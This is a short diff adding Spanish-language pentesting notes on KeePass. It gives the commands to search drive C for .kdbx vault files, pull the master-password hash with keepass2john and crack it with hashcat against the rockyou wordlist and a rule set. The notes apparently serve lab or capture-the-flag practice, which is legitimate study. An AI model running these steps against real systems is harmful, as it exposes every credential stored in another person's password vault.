@@ -28,3 +28,15 @@
     https://hashcat.net/wiki/doku.php?id=rule_based_attack
 
 ### Keepass
+
+  Buscamos por archivos de Keepass:
+
+    Get-ChildItem -Path C: -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+  Nos transferimos el archivo a nuestro local y sacamos el hash con keepass2john:
+
+    └─# keepass2john Database.kdbx > keepass.hash
+
+  Lanzamos hashcat con la regla /rockyou-30000.rule para crackear la contraseña:
+
+    └─# hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
